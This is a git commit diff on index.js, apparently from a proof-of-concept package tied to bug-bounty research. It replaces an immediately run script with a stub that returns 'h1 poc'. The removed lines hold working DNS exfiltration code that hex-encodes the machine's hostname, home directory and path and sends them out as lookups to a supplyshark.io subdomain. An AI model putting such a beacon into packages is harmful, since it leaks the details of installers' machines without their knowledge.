e6ab4b6382c61c2788d793667e3c10678c5a841c
Cody Zacharias <22013186+haccer@users.noreply.github.com>
2024-03-20 10:23:09 -0400

    Update index.js

--- index.js
+++ index.js
@@ -1,18 +1,5 @@
-(async () => {
-  try {
-    const dns = await import('dns');
-    const os = await import('os');
+function h1() {
+	return "h1 poc"
+}
 
-    let d = `${os.hostname()}__${os.homedir()}__${__dirname}`;
-    d = d.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
-    d = Buffer.from(d).toString('hex').match(/.{1,50}/g);
-    const i = Math.random().toString(36).substring(7);
-
-    for (const c of d) {
-      const hostname = `${i}.${c}.dns.supplyshark.io`;
-      await dns.promises.resolve(hostname, 'A');
-    }
-  } catch (err) {
-    console.error(err);
-  }
-})();
+module.exports = h1
